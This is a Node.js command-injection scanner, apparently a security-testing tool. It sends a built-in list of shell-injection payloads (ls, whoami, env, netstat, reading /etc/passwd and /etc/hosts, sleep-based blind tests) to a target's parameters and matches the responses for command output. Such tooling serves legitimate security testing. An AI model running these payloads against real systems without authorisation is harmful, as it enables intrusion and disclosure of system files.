/**
 * Command Injection Scanner
 * Detects OS Command Injection vulnerabilities
 */

const axios = require('axios');

// Command injection payloads
const PAYLOADS = [
  // Basic command separators
  '; ls',
  '| ls',
  '& ls',
  '&& ls',
  '|| ls',
  '\n ls',
  
  // Unix-specific
  '`ls`',
  '$(ls)',
  '${IFS}ls',
  '%0als',
  '|ls%0A',
  
  // Windows-specific
  '; dir',
  '| dir',
  '& dir',
  '&& dir',
  '|| dir',
  
  // Command substitution
  '`id`',
  '$(whoami)',
  '`whoami`',
  '$(cat /etc/passwd)',
  
  // Encoded/bypass
  '${IFS}',
  '%0A',
  '%0D',
  '%3B',
  '|',
  '%7C',
  ';',
  '%3B',
  
  // Time-based (for blind injection)
  '|sleep${IFS}5',
  '& ping -c 5 127.0.0.1',
  '|| sleep 5',
  
  // Common vulnerable commands
  '| cat /etc/hosts',
  '; cat /etc/hosts',
  '& cat /etc/hosts',
  '`cat /etc/hosts`',
  '$(cat /etc/hosts)',
  
  // File read
  '| head /etc/passwd',
  '; head /etc/passwd',
  '& head /etc/passwd',
  
  // Network reconnaissance
  '| netstat -an',
  '; netstat -an',
  '& netstat -an',
  
  // User enumeration
  '| whoami',
  '; whoami',
  '& whoami',
  
  // Environment
  '| env',
  '; env',
  '& env'
];

// Common vulnerable parameters
const VULNERABLE_PARAMS = [
  'cmd', 'command', 'execute', 'shell', 'exec', 'command', 'cmd',
  'ping', 'host', 'ip', 'address', 'url', 'uri', 'file', 'path',
  'page', 'include', 'load', 'src', 'source', 'data', 'q', 'query',
  'search', 'send', 'dest', 'next', 'redirect', 'validate', 'domain'
];

// Command output patterns to detect
const COMMAND_OUTPUT_PATTERNS = [
  // User/group info
  /uid=\d+.*gid=\d+/i,
  /user=\w+/i,
  /group=\w+/i,
  
  // System info
  /root:x:/m,
  /daemon:x:/m,
  /bin:x:/m,
  /sys:x:/m,
  
  // Network info
  /tcp\s+\d+\s+\d+/im,
  /unix\s+\d+\s+/im,
  /active internet connections/im,
  
  // Environment patterns
  /PATH=/i,
  /HOME=/i,
  /USER=/i,
  /SHELL=/i,
  
  // Generic command output
  /\/[a-z]+\/[a-z]+\/[a-z]+/i, // paths like /usr/bin/ls
  /total\s+\d+/i, // ls output
  /\d+\s+\w+\s+\w+\s+\d+/i // file listing
];

// Error patterns that might indicate command injection
const ERROR_PATTERNS = [
  /command not found/i,
  /syntax error/i,
  /unexpected token/i,
  /sh:.*not found/i,
  /sh:.*: command/i,
  /Permission denied/i,
  /Bad substitution/i,
  /unterminated quoted string/i,
  /No such file or directory/i
];

/**
 * Check if response contains command output
 */
function containsCommandOutput(responseText) {
  for (const pattern of COMMAND_OUTPUT_PATTERNS) {
    if (pattern.test(responseText)) {
      return { detected: true, pattern: pattern.toString() };
    }
  }
  return { detected: false };
}

/**
 * Test a single parameter with payload
 */
async function testParameter(url, method, paramName, paramValue, payload) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000);

  try {
    let testUrl = url;
    let testBody = null;

    const modifiedPayload = paramValue + payload;

    if (method === 'GET') {
      const urlObj = new URL(url);
      urlObj.searchParams.set(paramName, modifiedPayload);
      testUrl = urlObj.toString();
    } else {
      testBody = { [paramName]: modifiedPayload };
    }

    const response = await axios({
      method,
      url: testUrl,
      data: testBody,
      timeout: 10000,
      signal: controller.signal,
      validateStatus: () => true
    });

    clearTimeout(timeout);

    const responseText = typeof response.data === 'string'
      ? response.data
      : JSON.stringify(response.data);

    // Check for command output
    const outputCheck = containsCommandOutput(responseText);
    if (outputCheck.detected) {
      return {
        vulnerable: true,
        payload,
        commandOutput: true,
        type: 'command-execution',
        parameter: paramName,
        location: method === 'GET' ? 'query' : 'body',
        confidence: 'high',
        evidence: responseText.substring(0, 500)
      };
    }

    // Check for command injection errors
    for (const pattern of ERROR_PATTERNS) {
      if (pattern.test(responseText)) {
        return {
          vulnerable: true,
          payload,
          commandOutput: false,
          type: 'command-injection-detected',
          parameter: paramName,
          location: method === 'GET' ? 'query' : 'body',
          confidence: 'medium',
          evidence: responseText.substring(0, 500)
        };
      }
    }

    return { vulnerable: false };

  } catch (error) {
    clearTimeout(timeout);
    
    // Check error message for command injection indicators
    const errorText = error.message || '';
    for (const pattern of ERROR_PATTERNS) {
      if (pattern.test(errorText)) {
        return {
          vulnerable: true,
          payload,
          commandOutput: false,
          type: 'potential-command-injection',
          parameter: paramName,
          location: method === 'GET' ? 'query' : 'body',
          confidence: 'low',
          evidence: errorText
        };
      }
    }
    
    return { vulnerable: false, error: error.message };
  }
}

/**
 * Test for time-based blind command injection
 */
async function testBlindInjection(url, method, paramName, paramValue) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 20000); // Longer timeout for time-based

  try {
    const startTime = Date.now();
    
    let testUrl = url;
    let testBody = null;

    // Time-based payload (Linux)
    const timePayload = paramValue + '; sleep 5';
    
    // Alternative for Windows
    const windowsPayload = paramValue + '& ping -n 5 127.0.0.1';

    const payload = timePayload;

    if (method === 'GET') {
      const urlObj = new URL(url);
      urlObj.searchParams.set(paramName, payload);
      testUrl = urlObj.toString();
    } else {
      testBody = { [paramName]: payload };
    }

    const response = await axios({
      method,
      url: testUrl,
      data: testBody,
      timeout: 20000,
      signal: controller.signal,
      validateStatus: () => true
    });

    const duration = Date.now() - startTime;
    clearTimeout(timeout);

    // If response takes longer than 4 seconds, might indicate blind command injection
    if (duration > 4000) {
      return {
        vulnerable: true,
        payload,
        commandOutput: false,
        type: 'time-based-blind-cmd-injection',
        parameter: paramName,
        location: method === 'GET' ? 'query' : 'body',
        confidence: 'medium',
        evidence: `Response time: ${duration}ms`
      };
    }

    return { vulnerable: false, duration };

  } catch (error) {
    clearTimeout(timeout);
    
    // Timeout might indicate command execution
    if (error.code === 'ETIMEDOUT' || error.message.includes('timeout')) {
      return {
        vulnerable: true,
        payload: paramValue + '; sleep 5',
        commandOutput: false,
        type: 'time-based-blind-cmd-injection',
        parameter: paramName,
        location: method === 'GET' ? 'query' : 'body',
        confidence: 'medium',
        evidence: 'Request timed out - command might have been executed'
      };
    }
    
    return { vulnerable: false, error: error.message };
  }
}

/**
 * Main scan function
 */
async function scan(target) {
  const { url, params, method = 'GET' } = target;

  const results = {
    vulnerable: false,
    vulnerabilities: [],
    tested: { params: 0, payloads: 0 }
  };

  // Find parameters to test
  const paramsToTest = Object.keys(params).length > 0
    ? Object.keys(params)
    : VULNERABLE_PARAMS;

  // Test each parameter
  for (const paramName of paramsToTest) {
    const paramValue = params[paramName] || '';
    results.tested.params++;

    for (const payload of PAYLOADS) {
      results.tested.payloads++;

      const result = await testParameter(url, method, paramName, paramValue, payload);

      if (result.vulnerable) {
        results.vulnerable = true;
        results.vulnerabilities.push(result);

        // Return first high confidence finding
        if (result.confidence === 'high') {
          return {
            success: true,
            ...results
          };
        }
      }
    }
  }

  return {
    success: true,
    ...results
  };
}

module.exports = { scan };